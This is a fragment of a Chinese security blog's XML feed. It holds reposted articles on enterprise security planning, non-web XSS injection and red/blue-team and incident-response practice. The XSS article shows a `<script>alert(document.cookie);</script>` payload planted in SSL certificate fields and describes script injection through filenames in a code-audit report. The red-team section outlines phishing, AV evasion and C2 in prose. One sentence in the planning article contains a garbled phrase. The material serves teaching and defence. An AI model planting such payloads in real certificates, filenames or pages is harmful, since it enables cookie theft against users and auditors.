通过通信接口输入的数据格式和长度符合系统的设定要求；应提供自我保护功能，当故障发生时自动保护当前的所有状态，保证系统能够恢复。</li><li>资源控制：当应用系统的通信耍弄福冈中等乙方在一段时间内未作任何响应，另一方应能够自动结束会话；应能对系统的最大并发会话连接数和单个账户的多重并发会话进行限制；应能对一个时间段可能的并发会话连接数进行限制；应能对一个访问账户或一个请求进程所申请的资源数进行控制；应能够检测SLA水平，到达预设值时进行告警。</li></ul></li><li><p>防护设备：</p><ul><li>4A：提供身份识别、认证、访问控制和审核功能。</li><li>Web 应用防火墙：提供数据输入验证和审核功能。</li><li>网页防篡改</li><li>抗 DDoS 设备</li><li>Web 漏洞扫描</li></ul></li><li><p>防护技术：</p><ul><li>4A</li><li>代码审计</li><li>基线检查和加固</li><li>渗透测试</li></ul></li></ul><h4 id="管理文档列表（示例）"><a href="#管理文档列表（示例）" class="headerlink" title="管理文档列表（示例）"></a>管理文档列表（示例）</h4><p>等保的文档体系或 ISO 27001 的文档体系，自己找找吧。</p><h3 id="安全运行"><a href="#安全运行" class="headerlink" title="安全运行"></a>安全运行</h3><p>购买了安全产品，编写了相关的管理文档，制定了各种工作流程，后面主要的工作就是安全运行/运营，实际上就是用好已有的安全控制措施。</p><p>简单以资产管理为例：</p><ul><li>概述：通过资产管理，确定当前的资产状态，可以快速确认攻击面和某个软件版本缺陷的影响范围。</li><li>范围：组织所有 IT 设备，内外网 IP、端口</li><li>防护目标：及时发现新启用的 IP 和端口，业务系统所依赖重要的软件和版本的变更。</li><li>防护要点：<ul><li>结合网络拓扑，对组织内的物理设备和系统进行清查；</li><li>梳理组织使用的软件和版本信息，需要确切了解用于支持业务系统的各种软件名称和详细版本；</li><li>映射组织的（业务）通信和数据流，确定哪些业务会涉及使用到哪些设备；</li><li>资源（例如，硬件，设备，数据和软件）的分类，重要性和商业价值</li><li>资产负责人信息、外部供应商信息、外包运维信息。</li></ul></li><li>管理制度和流程<ul><li>资产管理制度</li><li>业务上线/下线流程</li><li>网络端口开放或变更流程</li></ul></li><li>设备或系统支持：<ul><li>资产管理系统</li><li>IP 端口扫描工具</li></ul></li><li>工作输出：<ul><li>当前资产表</li><li>IP、端口监控告警历史</li></ul></li></ul><h2 id="0x03-安全规划的执行"><a href="#0x03-安全规划的执行" class="headerlink" title="0x03 安全规划的执行"></a>0x03 安全规划的执行</h2><h3 id="人员培训"><a href="#人员培训" class="headerlink" title="人员培训"></a>人员培训</h3><p>整块信息安全工作并不是安全部门自己的事情，需要其他部门的配合，并且增加了其他部门的实际工作量。这就需要以合适的方式让安全部门外的成员理解信息安全工作，获取工作所需要的安全技能，通常是通过培训和考核进行。</p><p>这块很重要，通过培训和交流让其他成员支持信息安全工作。</p><h3 id="工作任务分解"><a href="#工作任务分解" class="headerlink" title="工作任务分解"></a>工作任务分解</h3><p>根据安全评估了解目前最缺乏的安全措施，那就是最优先需要解决的工作，所以最开始还是梳理资产，评估威胁、漏洞、风险，确认目前急需提升的安全防护措施。</p><p>根据现有安全部门组织结构安排工作，涉及部门和人员最少，最有效果的安全措施优先安排，需要其他部门配合的安全措施要与关联部门和人员讨论后进行安排。</p><h2 id="0x04-安全规划示例（目录）"><a href="#0x04-安全规划示例（目录）" class="headerlink" title="0x04 安全规划示例（目录）"></a>0x04 安全规划示例（目录）</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">目录</span><br><span class="line">信息安全规划  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>   概述  <span class="number">1</span></span><br><span class="line"><span class="number">1.1</span> 整体安全形势分析    <span class="number">1</span></span><br><span class="line"><span class="number">1.2</span> 行业安全形势分析    <span class="number">1</span></span><br><span class="line"><span class="number">1.3</span> 内部信息安全概况    <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   信息安全需求分析    <span class="number">2</span></span><br><span class="line"><span class="number">2.1</span> 合规性要求   <span class="number">2</span></span><br><span class="line"><span class="number">2.2</span> 集团要求    <span class="number">2</span></span><br><span class="line"><span class="number">2.3</span> 业务需求    <span class="number">2</span></span><br><span class="line"><span class="number">3</span>   信息安全策略和目标   <span class="number">3</span></span><br><span class="line"><span class="number">3.1</span> 信息安全策略  <span class="number">4</span></span><br><span class="line"><span class="number">3.2</span> 信息安全目标  <span class="number">4</span></span><br><span class="line"><span class="number">4</span>   信息安全保障体系    <span class="number">4</span></span><br><span class="line"><span class="number">4.1</span> 设计原则    <span class="number">4</span></span><br><span class="line"><span class="number">4.2</span> 安全建设的层次 <span class="number">3</span></span><br><span class="line"><span class="number">4.3</span> 安全保障体系  <span class="number">5</span></span><br><span class="line"><span class="number">5</span>   信息安全组织和职能   <span class="number">6</span></span><br><span class="line"><span class="number">5.1</span> 安全组织设置  <span class="number">6</span></span><br><span class="line"><span class="number">5.1</span><span class="number">.1</span>   安全协调组织  <span class="number">6</span></span><br><span class="line"><span class="number">5.1</span><span class="number">.2</span>   安全响应中心  <span class="number">6</span></span><br><span class="line"><span class="number">5.1</span><span class="number">.3</span>   各分支机构安全组织   <span class="number">7</span></span><br><span class="line"><span class="number">5.2</span> 安全组织职责  <span class="number">7</span></span><br><span class="line"><span class="number">5.2</span><span class="number">.1</span>   安全协调组织职责    <span class="number">7</span></span><br><span class="line"><span class="number">5.2</span><span class="number">.2</span>   安全响应中心职责    <span class="number">8</span></span><br><span class="line"><span class="number">5.2</span><span class="number">.3</span>   各分支机构安全组织职责 <span class="number">8</span></span><br><span class="line"><span class="number">5.3</span> 安全人员管理  <span class="number">9</span></span><br><span class="line"><span class="number">6</span>   安全防护重点风险分析  <span class="number">10</span></span><br><span class="line"><span class="number">7</span>   信息安全保障体系建设  <span class="number">10</span></span><br><span class="line"><span class="number">7.1</span> 信息安全管理体系建设  <span class="number">10</span></span><br><span class="line"><span class="number">7.1</span><span class="number">.1</span>   组织结构    <span class="number">10</span></span><br><span class="line"><span class="number">7.1</span><span class="number">.2</span>   安全培训    <span class="number">10</span></span><br><span class="line"><span class="number">7.1</span><span class="number">.3</span>   标准、制度和流程    <span class="number">24</span></span><br><span class="line"><span class="number">7.1</span><span class="number">.4</span>   外部联系工作  <span class="number">24</span></span><br><span class="line"><span class="number">7.2</span> 信息安全技术体系建设  <span class="number">24</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.1</span>   物理安全    <span class="number">24</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.2</span>   网络安全    <span class="number">25</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.3</span>   主机安全    <span class="number">25</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.4</span>   云安全 <span class="number">25</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.5</span>   应用安全    <span class="number">26</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.6</span>   数据安全    <span class="number">26</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.7</span>   业务安全    <span class="number">26</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.8</span>   隐私保护    <span class="number">26</span></span><br><span class="line"><span class="number">7.3</span> 信息安全运行体系建设  <span class="number">27</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.1</span>   资产和漏洞生命周期管理 <span class="number">27</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.2</span>   发布和变更管理 <span class="number">28</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.3</span>   信息安全事件管理和应急演练   <span class="number">28</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.4</span>   重要时期信息安全保障  <span class="number">31</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.5</span>   日常工作和迎检工作   <span class="number">31</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.6</span>   软件安全开发生命周期  <span class="number">31</span></span><br><span class="line"><span class="number">8</span>   办公网安全   <span class="number">32</span></span><br><span class="line"><span class="number">8.1</span> 网络安全    <span class="number">32</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.1</span>   边界控制    <span class="number">32</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.2</span>   安全域划分   <span class="number">32</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.3</span>   入侵检测    <span class="number">33</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.4</span>   上网行为管理  <span class="number">33</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.5</span>   远程访问    <span class="number">33</span></span><br><span class="line"><span class="number">8.2</span> 终端安全    <span class="number">33</span></span><br><span class="line"><span class="number">8.2</span><span class="number">.1</span>   杀毒软件管理  <span class="number">33</span></span><br><span class="line"><span class="number">8.2</span><span class="number">.2</span>   补丁管理    <span class="number">33</span></span><br><span class="line"><span class="number">8.2</span><span class="number">.3</span>   主机加固    <span class="number">33</span></span><br><span class="line"><span class="number">8.3</span> 无线和手机设备安全   <span class="number">34</span></span><br><span class="line"><span class="number">8.3</span><span class="number">.1</span>   无线安全    <span class="number">34</span></span><br><span class="line"><span class="number">8.3</span><span class="number">.2</span>   移动设备管理  <span class="number">34</span></span><br><span class="line"><span class="number">8.4</span> 数据防泄密   <span class="number">34</span></span><br><span class="line"><span class="number">8.5</span> 内部系统安全  <span class="number">34</span></span><br><span class="line"><span class="number">9</span>   重点信息安全风险与保障体系对应关系   <span class="number">34</span></span><br><span class="line"><span class="number">9.1</span> 风险与保障体系对应关系 <span class="number">34</span></span><br><span class="line"><span class="number">9.2</span> 保障体系与合规性对应关系    <span class="number">35</span></span><br><span class="line"><span class="number">10</span>  工作规划和计划 <span class="number">35</span></span><br><span class="line"><span class="number">10.1</span>    工作分解思路  <span class="number">35</span></span><br><span class="line"><span class="number">10.2</span>    重点系统开发计划    <span class="number">36</span></span><br><span class="line"><span class="number">10.3</span>    长期工作规划  <span class="number">36</span></span><br><span class="line"><span class="number">10.4</span>    本年度工作计划 <span class="number">36</span></span><br><span class="line"><span class="number">11</span>  信息安全工作度量    <span class="number">36</span></span><br><span class="line"><span class="number">11.1</span>    评价体系和原则 <span class="number">37</span></span><br><span class="line"><span class="number">11.1</span><span class="number">.1</span>  评价体系    <span class="number">37</span></span><br><span class="line"><span class="number">11.1</span><span class="number">.2</span>  选拔机制    <span class="number">37</span></span><br><span class="line"><span class="number">11.1</span><span class="number">.3</span>  管理者的权利和义务   <span class="number">37</span></span><br><span class="line"><span class="number">11.2</span>    考核对象和考核方法   <span class="number">38</span></span><br><span class="line"><span class="number">11.2</span><span class="number">.1</span>  团队考核    <span class="number">38</span></span><br><span class="line"><span class="number">11.2</span><span class="number">.2</span>  个人考核    <span class="number">38</span></span><br><span class="line"><span class="number">11.2</span><span class="number">.3</span>  安全设备、系统效果评估 <span class="number">39</span></span><br><span class="line"><span class="number">11.2</span><span class="number">.4</span>  安全策略、安全程序效果评估   <span class="number">40</span></span><br><span class="line"><span class="number">11.3</span>    考核时间    <span class="number">40</span></span><br><span class="line"><span class="number">11.4</span>    奖励和问责   <span class="number">40</span></span><br><span class="line"><span class="number">12</span>  持续改进    <span class="number">40</span></span><br><span class="line"><span class="number">13</span>  附录  <span class="number">41</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转自 ：&lt;a href=&quot;https://xz.aliyun.com/t/2424&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/2424&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-安全规划的目的&quot;&gt;&lt;a href=&quot;#0x00-安全规划的目的&quot; class=&quot;headerlink&quot; title=&quot;0x00 安全规划的目的&quot;&gt;&lt;/a&gt;0x00 安全规划的目的&lt;/h2&gt;&lt;p&gt;组织安全部门建立到运行一段的时间，工作阶段从救火到标准化的过程就需要考虑编制和实施适合自己组织的安全规划了。&lt;/p&gt;
&lt;p&gt;编写安全规划主要为以后的工作进行合理的估计和安排，从结构上提升组织的安全水平，大概是从杂牌军到正规军的转变，也有可能现有的方法满足不了实际业务的需求，需要重新规划、设计。&lt;/p&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全规划" scheme="http://pa55w0rd.github.io/tags/%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%92/"/>
    
      <category term="指南" scheme="http://pa55w0rd.github.io/tags/%E6%8C%87%E5%8D%97/"/>
    
  </entry>
  
  <entry>
    <title>看！这里有三种非Web型的XSS注入漏洞 （转发）</title>
    <link href="http://pa55w0rd.github.io/%E9%9D%9Eweb%E5%9E%8Bxss%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://pa55w0rd.github.io/非web型xss注入漏洞/</id>
    <published>2018-10-29T03:36:20.000Z</published>
    <updated>2018-11-21T08:53:12.816Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文：<a href="https://websec.ca/publication/Blog/Three-Non-Web-based-XSS-Injections" target="_blank" rel="noopener">https://websec.ca/publication/Blog/Three-Non-Web-based-XSS-Injections</a></p></blockquote><blockquote><p>译文：<a href="https://xz.aliyun.com/t/3048" target="_blank" rel="noopener">https://xz.aliyun.com/t/3048</a></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前些天，我跟老友Chris Navarrete进行了一次深入的交流，当谈及为什么选择这个职业时，我给出的理由是：</p><p>我们喜欢让事物以迥异于初衷的方式运作，例如利用缓冲区溢出来改变执行流程的方向、将JavaScript代码注入到不该注入的地方。</p><p>对于大部分Web安全方面的教程来说，都是教我们如何以非常简单的方式来测试XSS漏洞 “XSS漏洞”)：在反射或存储Web请求中的数据输入时，没有进行严格的安全过滤处理，从而导致反射型XSS或存储型XSS漏洞。</p><p>通常情况下，当讨论应用程序的安全性时，我们都知道“永远不要信任任何数据输入”这道圣谕；遗憾的是，并非所有开发人员都透彻地理解了“任何数据输入”的真正含义，因此，攻击者总有许多可乘之机。下面，我们举例进行说明：</p><a id="more"></a><h2 id="0x01-PowerDNS-Recursor"><a href="#0x01-PowerDNS-Recursor" class="headerlink" title="0x01 PowerDNS Recursor"></a>0x01 PowerDNS Recursor</h2><p>在我们的讨论中，Chris曾经提到曾在一个流行的DNS软件中发现了一个不同寻常的XSS漏洞，所以，我决定以它为例，让读者意识到Web并非唯一的攻击向量。</p><p>PowerDNS Recursor是一款高端、高性能的名称解析服务器，至少可以为1亿用户提供DNS解析服务。该产品的设计初衷，主要就是将其用于DNS解析服务器。</p><p>有一篇<a href="https://www.fortinet.com/blog/threat-research/powerdns-recursor-html-script-injection-vulnerability-a-walkthrough.html" target="_blank" rel="noopener">文章</a>详细展示了如何使用命令行工具dig通过DNS查询注入XSS有效载荷的过程：</p><p><img src="\assets\img\xss\1.png" alt="1"></p><p>之后，我们会在Web UI中看到：</p><p><img src="\assets\img\xss\2.png" alt="1"></p><h2 id="0x02-Symantec-SSL-Toolbox"><a href="#0x02-Symantec-SSL-Toolbox" class="headerlink" title="0x02 Symantec SSL Toolbox"></a>0x02 Symantec SSL Toolbox</h2><p>这是三年前我在赛门铁克的SSL Certificate Tester中找到的一个漏洞，在我提交后，目前该漏洞已经得到了修复。这个免费在线服务用于从给定URL的x509 SSL证书中提取和显示相应的值，由于它完全信任这些内容，所以没有对各个字段中的数据进行安全过滤。</p><p>因此，我创建了一个SSL证书，使其不同的字段中值都为<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>，并将其安装在Web服务器的前端：</p><p><img src="\assets\img\xss\3.png" alt="1"></p><p>所以，这个免费服务解析该证书的时候，就会执行JavaScript代码：</p><p><img src="\assets\img\xss\4.png" alt="1"></p><h2 id="0x03-RATS（Rough-Auditing-Tool-for-Security）"><a href="#0x03-RATS（Rough-Auditing-Tool-for-Security）" class="headerlink" title="0x03 RATS（Rough Auditing Tool for Security）"></a>0x03 RATS（Rough Auditing Tool for Security）</h2><p>RATS由CERN计算机安全部门开发一款非常优秀的静态代码分析工具。我个人非常喜欢这款工具，并且已经用了许多年了。然而，该工具已经于2013年12月停止更新，估计现在已经没有人在维护该项目了，但具体情况我也拿不准。</p><p>去年的时候，由于坐火车时很无聊，为了打发时间，竟然在该软件中找到了一个XSS漏洞。RATS需要接收一个包含源代码的文件夹，并创建一个包含分析结果的HTML报告，其中还包括所分析文件的名称，因此，攻击向量也就非常明显了。我在其名称中创建了一个包含JavaScript代码的文件：</p><p><img src="\assets\img\xss\5.png" alt="1"></p><p>分析完成之后，注入的JavaScript代码将在报告中呈现：</p><p><img src="\assets\img\xss\6.png" alt="1"></p><p>如果我是一名开发人员，并且知道自己repos中的代码肯定会进行安全审查的话，那么，我肯定会在文件名中加入相关代码来“搞”安全审计人员。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul><li>数据输入并不一定来自HTTP请求。</li><li>考虑所有可能的数据输入：从文件系统到数据库、用户名、时间戳、日志，不要放过任何可能性。</li><li>开发人员不要信任任何数据输入，在后端使用这些数据之前，一定要对接收到的数据以及发回给用户的数据进行彻底的安全过滤。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文：&lt;a href=&quot;https://websec.ca/publication/Blog/Three-Non-Web-based-XSS-Injections&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://websec.ca/publication/Blog/Three-Non-Web-based-XSS-Injections&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;译文：&lt;a href=&quot;https://xz.aliyun.com/t/3048&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/3048&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;前些天，我跟老友Chris Navarrete进行了一次深入的交流，当谈及为什么选择这个职业时，我给出的理由是：&lt;/p&gt;
&lt;p&gt;我们喜欢让事物以迥异于初衷的方式运作，例如利用缓冲区溢出来改变执行流程的方向、将JavaScript代码注入到不该注入的地方。&lt;/p&gt;
&lt;p&gt;对于大部分Web安全方面的教程来说，都是教我们如何以非常简单的方式来测试XSS漏洞 “XSS漏洞”)：在反射或存储Web请求中的数据输入时，没有进行严格的安全过滤处理，从而导致反射型XSS或存储型XSS漏洞。&lt;/p&gt;
&lt;p&gt;通常情况下，当讨论应用程序的安全性时，我们都知道“永远不要信任任何数据输入”这道圣谕；遗憾的是，并非所有开发人员都透彻地理解了“任何数据输入”的真正含义，因此，攻击者总有许多可乘之机。下面，我们举例进行说明：&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://pa55w0rd.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="非web型xss" scheme="http://pa55w0rd.github.io/tags/%E9%9D%9Eweb%E5%9E%8Bxss/"/>
    
  </entry>
  
  <entry>
    <title>甲方安全建设的一些思路和思考 （转发）</title>
    <link href="http://pa55w0rd.github.io/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF%E5%92%8C%E6%80%9D%E8%80%83/"/>
    <id>http://pa55w0rd.github.io/甲方安全建设的一些思路和思考/</id>
    <published>2018-10-29T03:35:20.000Z</published>
    <updated>2018-11-21T08:52:39.995Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转自  <a href="https://mp.weixin.qq.com/s/quwaJMVHYpBAXpkgtR12Kw" target="_blank" rel="noopener">安全小飞侠 https://mp.weixin.qq.com/s/quwaJMVHYpBAXpkgtR12Kw</a> </p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文主要是介绍一下笔者对于甲方安全能力建设的一些经验，心得和零散的思考。需要特别强调的是不同企业的实际情况不尽相同，本文仅供参考，不具普遍意义。</p><a id="more"></a><h2 id="0x01-Red-Teaming"><a href="#0x01-Red-Teaming" class="headerlink" title="0x01 Red Teaming"></a>0x01 Red Teaming</h2><p>近几年随着Red Team建设的话题越来越流行，不管是甲方或者乙方都在极力的发展自己的Red Teaming能力，尤其是各个乙方都推出了自己的Red Team的服务，如：<a href="https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/pf/ms/ds-red-team-for-security-operations.pdf" target="_blank" rel="noopener">FireEye</a>，但是最终目的都是为甲方输出检验企业的Detection和Response的能力，找到防御弱点进而优化防御系统和流程。</p><p>我们不禁要思考一下，到底什么样的企业才真的需要Red Team？当然，输出安全能力和服务的乙方不在讨论范围内，因为其最终是为了服务和支持甲方。根据我的观察和发现，目前大部分人很容易把Red Team和Penetration Testing弄混或者干脆混为一谈。其实二者有共同点但也有本质上的不同，简单做个比喻就是忍者(隐秘，快速，准确，一击即中)和海盗（强壮，贪婪，可以刚正面，一波高地）的区别，各有侧重和优劣，但侧重点不同，比如，Red Team类似忍者，侧重于精心准备（如：社会工程学等）收集信息进而绕过现有的防御体系（类似于APT）来检验防御和检测能力；而Penetration Testing则如同海盗，侧重于尽可能多地发现应用，系统，网络，设备等的漏洞，并利用其发现更深层或者复杂的漏洞从而来评估风险。所以，答案显而易见，一个企业只有拥有了基本的防御和检测的能力，并需要持续检测和改善这种能力时，Red Team就是很好地选择了。</p><p>那么，什么样的Red Team才算合格和有效呢？如前面所说，Red Team如同忍者去做暗杀，既然暗杀那么就需要一个详细的计划，如：目标是什么（暗杀对方头目），手段是什么（前期侦查对方大本营，守卫布局，对方头目的日常习惯和出现的场所，会不会功夫等），如何去执行（选择某个夜黑风高的晚上，众人都准备或者已经睡觉的时候，摸进对方大本营，提前隐藏在对方头目习惯出现的场所，等待其出现，再一刀毙命）。对应到Red Team就是，</p><ol><li><p>设置好这次行动目的是模拟偷取公司的客户资料；</p></li><li><p>提前做好侦查看看公司都可能有哪些人会碰到这类数据，有哪些防御检测方式（如：反病毒，入侵检测，流量分析）；</p></li><li><p>针对可能接触数据的人员做定向钓鱼攻击或者面对面的社工，安装专门制作的绕杀软的工具，利用常见的社交或者云存储网站来做C2，等待时机控制机器，获取必要的用户凭证，盗取客户资料，销毁痕迹，最终走人。</p></li></ol><p>因此，一个合格的Red Team，需要具备模拟攻击者入侵的各种能力，手段以及假想的目的。想要具备这种能力的一个最简单有效的方法，就是从现有的真实世界里发生的APT攻击活动中抽取TTP来模拟真实的threat actors，分类并总结他们曾今采用的手段，方法，技术和工具，然后加以优化和改进，最终结合每个Red Team活动的假想目的来模拟不同APT组织对于公司的入侵，以此来检测已有的防御和响应体系是否有效。</p><h2 id="0x02-Blue-Teaming"><a href="#0x02-Blue-Teaming" class="headerlink" title="0x02 Blue Teaming"></a>0x02 Blue Teaming</h2><p>我们在说Blue Team时，通常是指在一个企业里负责入侵检测和应急响应的团队的统称，一般情况下（尤其是规模较大的企业）会至少细分为以下几个团队：</p><ul><li><p>Threat Hunting（入侵检测）：主要负责根据已知威胁的TTP（如APT活动）和根据常见入侵活动的行为特征（如批量端口扫描，同一系统账户的短时多次尝试登录，office软件进程的可疑子进程的派生等等）来开发入侵检测规则，或者利用机器学习，深度学习等更高级的数据挖掘技术来研究和分析威胁特征；</p></li><li><p>Incident Response（应急响应）：主要负责处理和调查企业的安全事件（如：外部应用系统被入侵，内网主机被入侵，以及由Threat Hunting的规则触发的各类入侵报警等）以及从真实的安全事件中来分析和提取资产的IOC以及最新的威胁特征；</p></li><li><p>Vulnerability Management（漏洞管理）：主要负责对企业所有资产（包括应用和原代码）的持续漏洞扫描，追踪，修复以及管理；</p></li><li><p>Threat Intelligence（威胁情报）：主要负责追踪和分析外部已知APT活动，地下黑市和深网或暗网里的各种威胁情报信息，并加以分类总结成TTP以及IOC提供给其他团队加以利用和深层分析（如前面提到的Threat Hunting，以及Red Team）。</p></li></ul><p>而且这些子团队都不是独立工作的，其之间都是相互配合和支持的。我们可以举个常见的例子来加以解释一下，比如threat hunting可能会通过已知的规则发现了一个可能的入侵行为；接着incident response迅速跟进进行流量、日志或者取证的分析发现了之前未被识别的威胁特征；然后threat hunting基于该特征开发最新的检测规则，threat intelligence以此进行情报梳理和比对并最终发现这是某个最近比较活跃的APT组织的活动，随后搜集相关TTP反馈给threat hunting；最后，vulnerability management团队扫描企业所有可能存在弱点和受影响资产，追踪和修复。</p><p>综上可见，Blue Team不是gank选手，而是讲究的团队合作和相互配合的团战协作，合理的利用和集合各个子团队的优势便可以大大提高入侵检测的准确性和应急响应的快速性。</p><h2 id="0x03-应急响应"><a href="#0x03-应急响应" class="headerlink" title="0x03 应急响应"></a>0x03 应急响应</h2><p>在开始之前，先谈谈我个人理解的应急响应是什么？顾名思义就是对企业发生的安全事件作出快速应对和及时响应从而减少由于安全事件造成的影响。</p><p>一般情况下，任何安全事件的应急响应都可以分为以下几个阶段：</p><ol><li><p>Assessment（评估）：主要是初步梳理安全事件产生的原因和评估潜在影响范围；</p></li><li><p>Containment（控制）：这个阶段主要是快速找到止损/减轻方案（或者是临时应对措施）将事件影响尽可能控制在最小范围内；</p></li><li><p>Eradication（消除）：这个阶段是要找到安全事件产生的根本原因并提出和实施根治方案；</p></li><li><p>Recovery（恢复）：主要是确保所有受影响的系统或者服务完全恢复到安全状态；</p></li><li><p>Review（总结和审查）：这是每个应急响应的最后阶段主要是总结和梳理安全事件处理和响应的整个时间线和应对方案，学习和审查安全事件产生的根本原因并生成知识库以便以后遇到同类安全事件可以快速地找到处理和应对的方法。</p></li></ol><p>为了便于大家更好地理解怎么运用以上这些步骤来帮助我们做好应急响应，以下我以一个企业经常会碰到的钓鱼邮件为案例。比如，我们的企业员工上报了一封钓鱼邮件，那么作为应急响应团队应该怎么做？我们都知道钓鱼邮件是入侵者（APT组织）攻击大型企业的最直接有效的方法。当我们的应急响应人员遇到这样的攻击试图时，</p><p>第一步，我们要初步分析钓鱼邮件的攻击方法，通常有：</p><ul><li><p>Credential Harvesting：设置一个伪造的邮箱或者系统登录界面（如发送一个诱饵链接或者在邮件里嵌入一个html页面）来盗取有效的用户名和密码；</p></li><li><p>Malware：一般包括两种方式，一是通过附件直接发送恶意文件，二是通过发送链接来诱骗用户点击下载恶意文件。初步分析了攻击方法，我们就需要评估影响，比如，哪些人收到了该邮件，哪些人可能访问了恶意链接，哪些人下载了恶意文件，哪些人执行了恶意文件，哪些数据可能受到影响等等；</p></li></ul><p>第二步，实施控制措施或者减轻方案，如针对通过链接来偷取用户名和密码或者下载第一阶段的恶意文件的域名我们可以实施DNS sinkhole（详情可以参照：<a href="https://en.m.wikipedia.org/wiki/DNS_sinkhole），对于利用附件直接发送恶意文件的情况我们可以通过静态或者动态沙箱（例如cuckoo，virustotal等）来分析恶意文件的行为并抽取IOC（可能是后续阶段C2的域名或者IP，亦或者是执行的子命令）实施DNS" target="_blank" rel="noopener">https://en.m.wikipedia.org/wiki/DNS_sinkhole），对于利用附件直接发送恶意文件的情况我们可以通过静态或者动态沙箱（例如cuckoo，virustotal等）来分析恶意文件的行为并抽取IOC（可能是后续阶段C2的域名或者IP，亦或者是执行的子命令）实施DNS</a> 